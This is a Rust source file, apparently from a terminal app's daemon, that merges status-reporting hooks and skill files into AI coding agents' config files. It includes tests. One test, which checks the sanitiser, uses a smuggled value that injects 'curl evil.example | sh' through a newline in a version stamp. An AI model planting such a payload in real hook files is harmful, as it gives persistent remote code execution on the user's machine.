//! Installing termio's agent integration into the agent config files on this box.
//!
//! Two write problems wearing one Settings toggle. **A skill is a file; a hook
//! is a merge.** The skill is one whole document termio owns at
//! `<skillDir>/termio/SKILL.md`; a hook goes into a file the user also owns and
//! edits, so every rule below is about not damaging it:
//!
//! - never overwrite a config that does not parse — a file we cannot read is a
//!   file we cannot merge into, and rewriting it would discard whatever it held;
//! - never claim a file that is not ours — `termio.js` is a plausible name for a
//!   user's own plugin, and a script named after a lifecycle event is a
//!   plausible name for a user's own hook;
//! - strip the third-party writers in [`CONFLICTING_HOOK_MARKERS`] that
//!   full-replace the shared `hooks` block instead of merging into it, so the
//!   next destructive writer cannot out-merge us;
//! - write nothing when the bytes already match.
//!
//! Stage 2 of `docs/design/20260825-agent-integration-moves-to-termiod.md` moves
//! the JSON-manifest dialect, the script-directory dialect, and the skill
//! installer. The plugin dialects and the TOML block are Stage 3 and are
//! reported as skipped rather than silently dropped — a silent no-op is exactly
//! what "no hooks on the VPS" looked like.

use super::machine;
use super::manifest::{AgentCatalog, AgentDefinition, HookDialect, HookEvent, HookSpec, HookType};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// The substring that identifies a *legacy* raw-socket entry as termio's — the
/// `printf … | nc -U …/agent-status.sock` hooks older builds installed, and the
/// `// Socket marker: …` comment still embedded in the plugin files.
pub const SOCKET_MARKER: &str = "agent-status.sock";

/// The substring that identifies a current CLI-based hook as termio's: every
/// hook installed for this Mac invokes the public `termio agent report <state>`
/// contract.
pub const CLI_MARKER: &str = "agent report";

/// The same role for a hook on a box, which has no `termio` and no app to report
/// to and instead names the daemon's own session id.
///
/// The SSH arm never had this: it emitted `set-status` hooks it could not
/// afterwards recognize, so a second install on the same device appended a
/// duplicate of every entry instead of replacing it. It is the fingerprint
/// `docs/design/20260824-agent-integration-on-a-device.md` §D2 specified;
/// spelled with the environment variable so it cannot match a user's own tool
/// that happens to have a `set-status` verb.
pub const DAEMON_MARKER: &str = "set-status \"$TERMIOD_SESSION_ID\"";

/// Fingerprints of third-party status hooks that full-replace the shared `hooks`
/// block instead of merging, wiping termio's entries. Stripped on install so a
/// destructive writer cannot out-merge us. Each substring is specific to one
/// tool's command, so a user's own hook is never matched — extend only with
/// equally specific fingerprints.
pub const CONFLICTING_HOOK_MARKERS: [&str; 2] = ["SUPERSET_HOME_DIR", "SUPERSET_AGENT_ID"];

/// Marker + version stamped into every installed hook (`# termio-hooks v0.33.0`).
pub const HOOK_VERSION_MARKER: &str = "# termio-hooks v";

/// The Mac's skill, and a box's. They are different documents, not two spellings
/// of one: the Mac's teaches the `termio sessions` CLI and gates on
/// `TERMIO_SESSION`, and a box has neither — shipping it there would teach an
/// agent to run a binary that is not installed.
const MAC_SKILL: &str = include_str!("../../../Sources/termio/Resources/skills/termio/SKILL.md");
const DEVICE_SKILL: &str =
    include_str!("../../../Sources/termio/Resources/skills/termio-device/SKILL.md");

/// How a hook reports, once it is running on this box.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Reporter {
    /// `termio agent report <state>` against the app's control socket. Reads the
    /// session from `$TERMIO_SESSION` and can mine the agent's stdin blob for a
    /// transcript path, a conversation id, a tool name and a prompt title.
    ///
    /// `path` is the app's channel-stable CLI copy under Application Support.
    /// The client supplies it because only the client knows it: it is a fact
    /// about the app that is listening, not about the box.
    TermioCli { path: String },
    /// `termiod set-status "$TERMIOD_SESSION_ID" <state>` against this daemon's
    /// own socket.
    ///
    /// **It carries state and title only.** `SetStatus` has no transcript,
    /// conversation, tool or prompt-title field, so the four stdin-mining
    /// options are dropped rather than emitted as flags the binary would reject.
    TermiodDaemon,
}

impl Reporter {
    /// The binary a hook invokes, absolute. The SSH arm had to emit
    /// `$HOME/.local/bin/termiod` — a shell *expression* that needed one
    /// escaping for `sh` and another for a Bun template literal — because the
    /// writer could not see the box. This one is the daemon's own path.
    fn binary_path(&self) -> String {
        match self {
            Reporter::TermioCli { path } => path.clone(),
            Reporter::TermiodDaemon => machine::daemon_binary(),
        }
    }

    fn is_local(&self) -> bool {
        matches!(self, Reporter::TermioCli { .. })
    }

    /// Which bundled skill this machine gets.
    fn skill(&self) -> &'static str {
        if self.is_local() {
            MAC_SKILL
        } else {
            DEVICE_SKILL
        }
    }
}

/// What the client asked for.
#[derive(Debug, Clone)]
pub struct InstallRequest {
    /// Install (true) or remove every integration termio has ever installed
    /// (false).
    pub enabled: bool,
    /// The ids the user has on their list, or `None` for the whole catalog.
    /// Which agents are enabled is a preference, so it stays the client's to
    /// state; where their files live is a fact about this box, so it does not.
    pub agents: Option<Vec<String>>,
    pub hooks: bool,
    pub skills: bool,
    pub reporter: Reporter,
    /// The version stamped into each hook command as a trailing shell comment.
    /// The command string changes between releases, so the stamp is what makes
    /// the idempotent write re-install the hook on the first launch after an
    /// upgrade.
    pub hook_version: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallStatus {
    /// The config carries termio's current wiring — including the common case
    /// where it already did and nothing was written.
    Installed,
    /// It was left alone on purpose (unparseable, or not ours to overwrite), or
    /// the write failed. `detail` says which.
    Failed,
    /// This daemon does not install this dialect yet. Reported rather than
    /// dropped: a silent no-op is the failure mode this must not have.
    Skipped,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct InstallResult {
    /// The agent's id, so a client can key its own roster off the reply.
    pub id: String,
    /// The agent's display name, for the sentence a Settings row shows.
    pub name: String,
    /// `hooks` or `skill`.
    pub kind: String,
    /// Where it landed on this box, resolved — the answer the client could not
    /// work out for itself.
    pub path: String,
    pub status: InstallStatus,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
}

impl InstallResult {
    fn new(
        agent: &AgentDefinition,
        kind: &str,
        path: &str,
        status: InstallStatus,
        detail: Option<String>,
    ) -> InstallResult {
        InstallResult {
            id: agent.id.clone(),
            name: agent.display_name.clone(),
            kind: kind.to_string(),
            path: path.to_string(),
            status,
            detail,
        }
    }
}

/// Apply `request` against this box's filesystem.
pub fn run(request: &InstallRequest) -> Vec<InstallResult> {
    let catalog = AgentCatalog::load();
    let mut results = Vec::new();
    if request.hooks {
        results.extend(sync_hooks(&catalog, request));
    }
    if request.skills {
        results.extend(sync_skills(&catalog, request));
    }
    results
}

fn selected<'a>(catalog: &'a AgentCatalog, request: &InstallRequest) -> Vec<&'a AgentDefinition> {
    match &request.agents {
        None => catalog.all.iter().collect(),
        Some(ids) => {
            let wanted: HashSet<&str> = ids.iter().map(String::as_str).collect();
            catalog
                .all
                .iter()
                .filter(|agent| wanted.contains(agent.id.as_str()))
                .collect()
        }
    }
}

// MARK: - Hooks

fn sync_hooks(catalog: &AgentCatalog, request: &InstallRequest) -> Vec<InstallResult> {
    if !request.enabled {
        // Sweep everything termio has ever installed, bundled declarations
        // included, so a shipped hook a user override removed or redirected is
        // cleaned too.
        let mut seen: Vec<&HookSpec> = Vec::new();
        for spec in catalog
            .bundled
            .iter()
            .chain(catalog.all.iter())
            .filter_map(|agent| agent.hooks.as_ref())
        {
            if !seen.contains(&spec) {
                seen.push(spec);
                uninstall_hooks(spec);
            }
        }
        return Vec::new();
    }

    // A full user override may intentionally remove or redirect a shipped hook.
    // Remove that old managed wiring before installing the merged catalog.
    for spec in catalog.stale_bundled_hooks() {
        uninstall_hooks(&spec);
    }

    selected(catalog, request)
        .into_iter()
        .filter_map(|agent| {
            let spec = agent.hooks.as_ref()?;
            Some(install_hooks(agent, spec, request))
        })
        .collect()
}

fn install_hooks(
    agent: &AgentDefinition,
    spec: &HookSpec,
    request: &InstallRequest,
) -> InstallResult {
    match spec.hook_type {
        HookType::Json => {
            let Some(file) = spec.file.as_deref() else {
                return InstallResult::new(
                    agent,
                    "hooks",
                    "",
                    InstallStatus::Failed,
                    Some("incomplete JSON hook manifest".into()),
                );
            };
            let installer = JsonHookFile::new(file, spec, request);
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &machine::expand(file).display().to_string(),
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
        HookType::Scripts => {
            let Some(directory) = spec.directory.as_deref() else {
                return InstallResult::new(
                    agent,
                    "hooks",
                    "",
                    InstallStatus::Failed,
                    Some("incomplete script hook manifest".into()),
                );
            };
            let installer = ScriptHookDirectory::new(directory, spec, request);
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &machine::expand(directory).display().to_string(),
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
        HookType::Plugin | HookType::Toml => InstallResult::new(
            agent,
            "hooks",
            &spec
                .file
                .as_deref()
                .or(spec.directory.as_deref())
                .map(|path| machine::expand(path).display().to_string())
                .unwrap_or_default(),
            InstallStatus::Skipped,
            Some(format!(
                "{} hooks are still installed by the app",
                spec.hook_type.as_str()
            )),
        ),
    }
}

fn uninstall_hooks(spec: &HookSpec) {
    match (spec.hook_type, spec.file.as_deref(), spec.directory.as_deref()) {
        (HookType::Json, Some(file), _) => JsonHookFile::bare(file, spec.dialect).uninstall(),
        (HookType::Scripts, _, Some(directory)) => {
            ScriptHookDirectory::bare(directory).uninstall()
        }
        // Stage 3 owns the plugin and TOML sweeps; until then the app's own
        // uninstall path still reaches them.
        _ => {}
    }
}

/// The shell command a hook runs. Every dialect converges on it, so the
/// agent-specific knowledge ("this lifecycle event means the agent is now
/// working") is baked in at install time and nothing agent-specific runs later.
pub fn report_command(
    state: &str,
    spec: &HookSpec,
    dialect: HookDialect,
    request: &InstallRequest,
) -> String {
    let binary = shell_quote_path(&request.reporter.binary_path());
    let mut command = match &request.reporter {
        Reporter::TermiodDaemon => {
            format!("{binary} set-status \"$TERMIOD_SESSION_ID\" {state}")
        }
        Reporter::TermioCli { .. } => {
            let mut command = format!("{binary} agent report {state}");
            // The agent's stdin blob is mined by the CLI (jq-free). Only enabled
            // for agents verified to always supply stdin, so the `cat` cannot
            // block. Each field name was validated at manifest load to be a bare
            // identifier, so it embeds safely.
            if spec.captures_transcript {
                command.push_str(" --transcript");
            }
            if let Some(field) = &spec.conversation {
                command.push_str(&format!(" --conversation-from {field}"));
            }
            if let Some(field) = &spec.tool {
                command.push_str(&format!(" --tool-from {field}"));
            }
            if let Some(field) = &spec.prompt_title {
                command.push_str(&format!(" --prompt-title-from {field}"));
            }
            command
        }
    };
    // Cursor reads the hook's stdout as its JSON reply, so the command must stay
    // silent and print a benign `{}`. The fallback keeps that contract even when
    // the binary itself could not run. Claude and Codex ignore hook stdout.
    command.push_str(match (&request.reporter, dialect) {
        (Reporter::TermioCli { .. }, HookDialect::CursorFlat) => {
            " --reply 2>/dev/null || printf '{}'"
        }
        (Reporter::TermiodDaemon, HookDialect::CursorFlat) => " 2>/dev/null; printf '{}'",
        _ => " 2>/dev/null || true",
    });
    command.push_str(&format!(
        " {HOOK_VERSION_MARKER}{}",
        version_stamp(&request.hook_version)
    ));
    command
}

/// Single-quotes a path for safe embedding in a hook shell command — the CLI
/// copy can sit under `/Applications/termio dev.app`.
fn shell_quote_path(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// The version stamp, reduced to characters that cannot end the trailing shell
/// comment it lives in.
///
/// A newline would: the comment is the last thing on the line, so anything after
/// one is a command the agent runs on every turn. The version is client-supplied,
/// and while a client holding the token can already spawn `sh -c` through
/// `create`, a hook is *persistent* — it would keep running after the client that
/// wrote it was gone. That is a different thing to leave lying around, and one
/// `retain` closes it.
fn version_stamp(version: &str) -> String {
    let stamped: String = version
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
        .take(64)
        .collect();
    if stamped.is_empty() {
        "0".to_string()
    } else {
        stamped
    }
}

/// Whether a command string is one termio installed.
fn is_ours(command: &str) -> bool {
    command.contains(CLI_MARKER) || command.contains(SOCKET_MARKER) || command.contains(DAEMON_MARKER)
}

fn is_theirs(command: &str) -> bool {
    CONFLICTING_HOOK_MARKERS
        .iter()
        .any(|marker| command.contains(marker))
}

// MARK: - The JSON-manifest dialect

/// Agents whose hooks live in a JSON file: Claude Code and Codex share the
/// nested Claude shape, Cursor a flat one with a required top-level `version`,
/// Copilot the flat shape plus a `type` on each entry.
struct JsonHookFile<'a> {
    /// The manifest's path, unexpanded, so a log line names what was declared.
    path: String,
    dialect: HookDialect,
    spec: Option<&'a HookSpec>,
    request: Option<&'a InstallRequest>,
    /// Dedicated `termio.json` files can disappear when their last managed hook
    /// is removed. Shared host files such as `settings.json` must remain.
    removes_file_when_empty: bool,
    /// Previous termio-owned filenames to strip during both install and
    /// uninstall, so a rename cannot leave the agent loading two copies.
    legacy_paths: Vec<String>,
}

impl<'a> JsonHookFile<'a> {
    fn new(path: &str, spec: &'a HookSpec, request: &'a InstallRequest) -> JsonHookFile<'a> {
        let mut file = JsonHookFile::bare(path, spec.dialect);
        file.spec = Some(spec);
        file.request = Some(request);
        file
    }

    fn bare(path: &str, dialect: HookDialect) -> JsonHookFile<'a> {
        let is_dedicated = Path::new(path)
            .file_name()
            .and_then(|name| name.to_str())
            .map(|name| name == "termio.json")
            .unwrap_or(false);
        let legacy_paths = if is_dedicated {
            let parent = Path::new(path)
                .parent()
                .map(|parent| parent.display().to_string())
                .unwrap_or_default();
            vec![format!("{parent}/termio-status.json")]
        } else {
            Vec::new()
        };
        JsonHookFile {
            path: path.to_string(),
            dialect,
            spec: None,
            request: None,
            removes_file_when_empty: is_dedicated,
            legacy_paths,
        }
    }

    fn install(&self) -> Result<(), String> {
        let (Some(spec), Some(request)) = (self.spec, self.request) else {
            return Err("nothing to install".into());
        };
        let (mut settings, expected) = match read_state(&self.path) {
            FileState::Ok(object, bytes) => (object, Some(bytes)),
            FileState::Missing(bytes) => (serde_json::Map::new(), bytes),
            FileState::Unreadable => {
                return Err(format!("refusing to modify unparseable {}", self.path))
            }
        };

        // Cursor and Copilot require a top-level schema version; add it only
        // when the user's file does not already carry one, so their choice is
        // never overwritten.
        if matches!(self.dialect, HookDialect::CursorFlat | HookDialect::CopilotFlat)
            && !settings.contains_key("version")
        {
            settings.insert("version".into(), serde_json::json!(1));
        }

        let mut hooks = match settings.get("hooks") {
            Some(serde_json::Value::Object(object)) => object.clone(),
            _ => serde_json::Map::new(),
        };
        // Strip every prior termio entry first — across all events, not just the
        // ones about to be re-added — so an event no longer managed does not
        // leave an orphan behind. Then drop the known third-party hooks that
        // full-replace the block, which makes this install authoritative.
        strip_groups(&mut hooks, &is_ours);
        strip_groups(&mut hooks, &is_theirs);

        for event in &spec.events {
            let command = report_command(&event.state, spec, self.dialect, request);
            let group = match self.dialect {
                HookDialect::CursorFlat => serde_json::json!({ "command": command }),
                HookDialect::CopilotFlat => {
                    serde_json::json!({ "type": "command", "command": command })
                }
                _ => {
                    let mut nested = serde_json::Map::new();
                    nested.insert(
                        "hooks".into(),
                        serde_json::json!([{ "type": "command", "command": command }]),
                    );
                    if let Some(matcher) = &event.matcher {
                        nested.insert("matcher".into(), serde_json::json!(matcher));
                    }
                    serde_json::Value::Object(nested)
                }
            };
            match hooks.get_mut(&event.name) {
                Some(serde_json::Value::Array(groups)) => groups.push(group),
                _ => {
                    hooks.insert(event.name.clone(), serde_json::json!([group]));
                }
            }
        }
        settings.insert("hooks".into(), serde_json::Value::Object(hooks));
        write_json(&self.path, &settings, expected.as_deref())?;

        // Publish the replacement before removing its predecessor: if the new
        // file could not be written, the working legacy integration stays.
        if !machine::expand(&self.path).exists() {
            return Err(format!("{} is missing after the write", self.path));
        }
        for legacy in &self.legacy_paths {
            self.uninstall_at(legacy, true);
        }
        Ok(())
    }

    fn uninstall(&self) {
        self.uninstall_at(&self.path, self.removes_file_when_empty);
        for legacy in &self.legacy_paths {
            self.uninstall_at(legacy, true);
        }
    }

    fn uninstall_at(&self, path: &str, remove_file_when_empty: bool) {
        // Nothing to remove if the file is absent; never overwrite one we cannot
        // read.
        let FileState::Ok(mut settings, expected) = read_state(path) else {
            return;
        };
        let Some(serde_json::Value::Object(mut hooks)) = settings.get("hooks").cloned() else {
            return;
        };
        strip_groups(&mut hooks, &is_ours);
        if hooks.is_empty() {
            settings.remove("hooks");
        } else {
            settings.insert("hooks".into(), serde_json::Value::Object(hooks));
        }
        if remove_file_when_empty && settings.is_empty() {
            remove(path);
        } else if let Err(error) = write_json(path, &settings, Some(&expected)) {
            log(&error);
        }
    }
}

enum FileState {
    /// No file, or a zero-byte one — nothing to merge into either way. Carries
    /// whatever is there so the write's precondition can still name it.
    Missing(Option<Vec<u8>>),
    Unreadable,
    Ok(serde_json::Map<String, serde_json::Value>, Vec<u8>),
}

fn read_state(path: &str) -> FileState {
    let resolved = machine::expand(path);
    if !resolved.exists() {
        return FileState::Missing(None);
    }
    let Ok(bytes) = std::fs::read(&resolved) else {
        return FileState::Unreadable;
    };
    if bytes.is_empty() {
        return FileState::Missing(Some(bytes));
    }
    match super::apple_json::parse(&bytes) {
        Some(serde_json::Value::Object(object)) => FileState::Ok(object, bytes),
        _ => FileState::Unreadable,
    }
}

/// Remove the groups a predicate claims from every hook event, dropping any
/// event left with no groups. Identifying entries by their command means a
/// user's own hook is never touched.
fn strip_groups(
    hooks: &mut serde_json::Map<String, serde_json::Value>,
    claims: &dyn Fn(&str) -> bool,
) {
    let keys: Vec<String> = hooks.keys().cloned().collect();
    for key in keys {
        let Some(serde_json::Value::Array(groups)) = hooks.get(&key) else {
            continue;
        };
        let kept: Vec<serde_json::Value> = groups
            .iter()
            .filter(|group| !group_matches(group, claims))
            .cloned()
            .collect();
        if kept.len() == groups.len() {
            continue;
        }
        if kept.is_empty() {
            hooks.remove(&key);
        } else {
            hooks.insert(key, serde_json::Value::Array(kept));
        }
    }
}

/// Cursor and Copilot carry the command directly; Claude and Codex nest it.
fn group_matches(group: &serde_json::Value, claims: &dyn Fn(&str) -> bool) -> bool {
    if let Some(command) = group.get("command").and_then(|value| value.as_str()) {
        return claims(command);
    }
    let Some(inner) = group.get("hooks").and_then(|value| value.as_array()) else {
        return false;
    };
    inner.iter().any(|entry| {
        entry
            .get("command")
            .and_then(|value| value.as_str())
            .map(claims)
            .unwrap_or(false)
    })
}

fn write_json(
    path: &str,
    settings: &serde_json::Map<String, serde_json::Value>,
    expected: Option<&[u8]>,
) -> Result<(), String> {
    let data = super::apple_json::to_bytes(&serde_json::Value::Object(settings.clone()));
    // Skip a write whose bytes already match — the common case on every sync —
    // so a user-owned file sees no churn at all.
    if Some(data.as_slice()) == expected {
        return Ok(());
    }
    write_if_unchanged(path, &data, expected)
}

// MARK: - The script-directory dialect

/// Agents whose hook contract is a *directory of executables* named after the
/// lifecycle event rather than a config file to merge: Cline runs
/// `~/.cline/hooks/TaskStart` and friends, matching by filename. Each script is
/// a two-line shell wrapper around the same report contract every other dialect
/// invokes, so nothing agent-specific runs.
struct ScriptHookDirectory<'a> {
    directory: String,
    spec: Option<&'a HookSpec>,
    request: Option<&'a InstallRequest>,
}

impl<'a> ScriptHookDirectory<'a> {
    fn new(
        directory: &str,
        spec: &'a HookSpec,
        request: &'a InstallRequest,
    ) -> ScriptHookDirectory<'a> {
        ScriptHookDirectory {
            directory: directory.to_string(),
            spec: Some(spec),
            request: Some(request),
        }
    }

    fn bare(directory: &str) -> ScriptHookDirectory<'a> {
        ScriptHookDirectory {
            directory: directory.to_string(),
            spec: None,
            request: None,
        }
    }

    fn install(&self) -> Result<(), String> {
        let (Some(spec), Some(request)) = (self.spec, self.request) else {
            return Err("nothing to install".into());
        };
        let keep: HashSet<&str> = spec.events.iter().map(|e| e.name.as_str()).collect();
        self.sweep(&keep);

        let mut refused = Vec::new();
        for event in &spec.events {
            let path = format!("{}/{}", self.directory, event.name);
            let contents = self.script(event, spec, request);
            if let Some(existing) = read_text(&path) {
                if existing != contents && !is_ours(&existing) {
                    refused.push(path);
                    continue;
                }
            }
            // Always written rather than skipped-when-identical: the agent execs
            // these by name, so the mode is as much a part of the install as the
            // bytes, and a file left non-executable by anything else is repaired
            // by re-writing it.
            if let Err(error) = write_atomically(&path, contents.as_bytes(), true) {
                refused.push(format!("{path}: {error}"));
            }
        }
        if refused.is_empty() {
            Ok(())
        } else {
            Err(format!(
                "refusing to overwrite non-termio hooks, or could not write: {}",
                refused.join(", ")
            ))
        }
    }

    fn uninstall(&self) {
        self.sweep(&HashSet::new());
    }

    /// Remove every script in the directory that is ours and not in `keep`.
    fn sweep(&self, keep: &HashSet<&str>) {
        let Ok(entries) = std::fs::read_dir(machine::expand(&self.directory)) else {
            return;
        };
        for entry in entries.filter_map(|entry| entry.ok()) {
            let Some(name) = entry.file_name().to_str().map(str::to_string) else {
                continue;
            };
            if keep.contains(name.as_str()) {
                continue;
            }
            let path = format!("{}/{name}", self.directory);
            match read_text(&path) {
                Some(existing) if is_ours(&existing) => remove(&path),
                _ => {}
            }
        }
    }

    fn script(&self, event: &HookEvent, spec: &HookSpec, request: &InstallRequest) -> String {
        format!(
            "#!/bin/sh\n{}\n",
            report_command(&event.state, spec, HookDialect::ClineScripts, request)
        )
    }
}

// MARK: - Skills

fn sync_skills(catalog: &AgentCatalog, request: &InstallRequest) -> Vec<InstallResult> {
    if !request.enabled {
        // Every skills directory termio has ever installed into — bundled
        // declarations plus the live catalog — so a shipped dir a user override
        // removed or redirected is swept too.
        let mut seen = HashSet::new();
        for agent in catalog.bundled.iter().chain(catalog.all.iter()) {
            let Some(directory) = agent.skill_dir.as_deref() else {
                continue;
            };
            let folder = format!("{directory}/termio");
            if seen.insert(folder.clone()) {
                let resolved = machine::expand(&folder);
                if resolved.exists() {
                    // termio owns the folder, so there is no user content in it
                    // to preserve.
                    if let Err(error) = std::fs::remove_dir_all(&resolved) {
                        log(&format!("could not remove {}: {error}", resolved.display()));
                    }
                }
            }
        }
        return Vec::new();
    }

    let skill = request.reporter.skill();
    let mut seen = HashSet::new();
    selected(catalog, request)
        .into_iter()
        .filter_map(|agent| {
            let directory = agent.skill_dir.as_deref()?;
            // Install only for agents whose CLI is actually here, so a box
            // without Cursor never grows a `~/.cursor/skills` it cannot use.
            // Re-checked on every sync, so an agent installed later is picked up.
            let present = match agent.command.as_deref() {
                Some(command) => machine::is_command_installed(command),
                None => true,
            };
            if !present {
                return None;
            }
            let path = format!("{directory}/termio/SKILL.md");
            if !seen.insert(path.clone()) {
                return None;
            }
            let resolved = machine::expand(&path).display().to_string();
            // Byte-compare, no version field: the skill is one whole document
            // termio owns.
            let outcome = if read_bytes(&path).as_deref() == Some(skill.as_bytes()) {
                Ok(())
            } else {
                write_atomically(&path, skill.as_bytes(), false)
            };
            Some(InstallResult::new(
                agent,
                "skill",
                &resolved,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            ))
        })
        .collect()
}

// MARK: - Filesystem

fn read_bytes(path: &str) -> Option<Vec<u8>> {
    std::fs::read(machine::expand(path)).ok()
}

fn read_text(path: &str) -> Option<String> {
    read_bytes(path).and_then(|bytes| String::from_utf8(bytes).ok())
}

fn remove(path: &str) {
    let resolved = machine::expand(path);
    if !resolved.exists() {
        return;
    }
    if let Err(error) = std::fs::remove_file(&resolved) {
        log(&format!("could not remove {}: {error}", resolved.display()));
    }
}

/// Commit a **merge**: write only while the file still holds exactly the bytes
/// the merge was computed from. `expected == None` means it must still be
/// absent.
///
/// A hook is a merge into a file the user also owns and edits, and
/// read-modify-write that ignores what happened in between silently discards
/// their edits — the one failure this must never produce. Refusing is the whole
/// guarantee; re-merging in a loop is not, and a loop that keeps rewriting a
/// file somebody is typing in is its own hazard. So a lost race reports the
/// agent as not installed, and the setup button is the retry.
fn write_if_unchanged(path: &str, data: &[u8], expected: Option<&[u8]>) -> Result<(), String> {
    let current = read_bytes(path);
    if current.as_deref() != expected {
        return Err(format!("{path} changed underneath the merge — not writing"));
    }
    write_atomically(path, data, false)
}

/// Written to a sibling temp file and renamed, so a reader never sees a
/// half-written config.
fn write_atomically(path: &str, data: &[u8], executable: bool) -> Result<(), String> {
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;

    let resolved = machine::expand(path);
    if let Some(parent) = resolved.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|error| format!("could not create {}: {error}", parent.display()))?;
    }
    let temporary = temporary_sibling(&resolved);
    let mut file = std::fs::File::create(&temporary)
        .map_err(|error| format!("could not write {}: {error}", resolved.display()))?;
    file.write_all(data)
        .and_then(|_| file.sync_all())
        .map_err(|error| format!("could not write {}: {error}", resolved.display()))?;
    drop(file);
    let mode = if executable { 0o755 } else { 0o644 };
    std::fs::set_permissions(&temporary, std::fs::Permissions::from_mode(mode))
        .map_err(|error| format!("could not set the mode on {}: {error}", resolved.display()))?;
    std::fs::rename(&temporary, &resolved).map_err(|error| {
        let _ = std::fs::remove_file(&temporary);
        format!("could not write {}: {error}", resolved.display())
    })
}

fn temporary_sibling(path: &Path) -> PathBuf {
    let mut name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "termio".to_string());
    name.push_str(".termio-tmp");
    path.with_file_name(name)
}

fn log(message: &str) {
    eprintln!("termiod: agent install {message}");
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::manifest::AgentManifest;

    fn request(reporter: Reporter) -> InstallRequest {
        InstallRequest {
            enabled: true,
            agents: None,
            hooks: true,
            skills: true,
            reporter,
            hook_version: "9.9.9".into(),
        }
    }

    fn spec(json: &str) -> HookSpec {
        AgentManifest::parse(json.as_bytes())
            .expect("parses")
            .definition()
            .expect("resolves")
            .hooks
            .expect("has hooks")
    }

    fn claude_spec() -> HookSpec {
        spec(
            r#"{"id":"claudeCode","name":"Claude Code","hooks":{"type":"json",
                "file":"~/.claude/settings.json","dialect":"claude",
                "capturesTranscript":true,"tool":"tool_name",
                "events":[{"on":"Stop","state":"done"}]}}"#,
        )
    }

    #[test]
    fn the_local_command_invokes_the_public_report_contract() {
        let request = request(Reporter::TermioCli {
            path: "/Users/x/Application Support/termio/bin/termio".into(),
        });
        let spec = claude_spec();
        let command = report_command("done", &spec, HookDialect::ClaudeNested, &request);
        assert_eq!(
            command,
            "'/Users/x/Application Support/termio/bin/termio' agent report done --transcript \
             --tool-from tool_name 2>/dev/null || true # termio-hooks v9.9.9"
        );
        assert!(is_ours(&command));
    }

    /// The daemon's `SetStatus` carries state and title only, so the four
    /// stdin-mining flags are dropped rather than emitted for a binary that
    /// would reject them.
    #[test]
    fn the_device_command_drops_the_flags_the_daemon_has_no_field_for() {
        let request = request(Reporter::TermiodDaemon);
        let spec = claude_spec();
        let command = report_command("working", &spec, HookDialect::ClaudeNested, &request);
        for flag in ["--transcript", "--conversation-from", "--tool-from", "--prompt-title-from"] {
            assert!(!command.contains(flag), "{flag} has no counterpart in set-status");
        }
        assert!(command.contains("set-status \"$TERMIOD_SESSION_ID\" working"));
        // And it is recognizable as ours, so a reinstall replaces it instead of
        // appending a second copy.
        assert!(is_ours(&command));
    }

    /// Cursor reads hook stdout as its JSON reply, so the command must print a
    /// benign empty object even when the binary could not run.
    #[test]
    fn cursor_keeps_its_reply_contract() {
        let local = report_command(
            "working",
            &claude_spec(),
            HookDialect::CursorFlat,
            &request(Reporter::TermioCli { path: "/x/termio".into() }),
        );
        assert!(local.ends_with("--reply 2>/dev/null || printf '{}' # termio-hooks v9.9.9"));
        let device = report_command(
            "working",
            &claude_spec(),
            HookDialect::CursorFlat,
            &request(Reporter::TermiodDaemon),
        );
        assert!(device.contains("2>/dev/null; printf '{}'"));
    }

    #[test]
    fn a_users_own_hooks_survive_and_a_destructive_writer_does_not() {
        let mut hooks: serde_json::Map<String, serde_json::Value> = serde_json::from_str(
            r#"{"Stop":[
                 {"hooks":[{"type":"command","command":"my-own-notifier"}]},
                 {"hooks":[{"type":"command","command":"/x/termio agent report done"}]},
                 {"hooks":[{"type":"command","command":"SUPERSET_HOME_DIR=/x superset hook"}]}
               ]}"#,
        )
        .expect("fixture");
        strip_groups(&mut hooks, &is_ours);
        strip_groups(&mut hooks, &is_theirs);
        assert_eq!(
            hooks["Stop"].as_array().map(Vec::len),
            Some(1),
            "only the user's own hook may survive"
        );
        assert!(hooks["Stop"][0]["hooks"][0]["command"]
            .as_str()
            .unwrap()
            .contains("my-own-notifier"));
    }

    /// The stamp is client-supplied and sits in a trailing shell comment, so a
    /// newline in it would put a command of the caller's choosing into a file
    /// the agent runs on every turn — and would keep running it long after that
    /// caller was gone.
    #[test]
    fn a_version_stamp_cannot_end_its_own_comment() {
        let mut request = request(Reporter::TermiodDaemon);
        request.hook_version = "1.0\ncurl evil.example | sh".into();
        let command = report_command("done", &claude_spec(), HookDialect::ClaudeNested, &request);
        assert!(!command.contains('\n'));
        assert!(command.ends_with("# termio-hooks v1.0curlevil.examplesh"), "{command}");
        request.hook_version = String::new();
        let command = report_command("done", &claude_spec(), HookDialect::ClaudeNested, &request);
        assert!(command.ends_with("# termio-hooks v0"));
    }

    /// An event left with no groups is dropped rather than kept as an empty
    /// array, so an event termio no longer manages leaves no orphan behind.
    #[test]
    fn an_emptied_event_is_removed() {
        let mut hooks: serde_json::Map<String, serde_json::Value> = serde_json::from_str(
            r#"{"Stop":[{"hooks":[{"type":"command","command":"/x/termio agent report done"}]}]}"#,
        )
        .expect("fixture");
        strip_groups(&mut hooks, &is_ours);
        assert!(hooks.is_empty());
    }
}
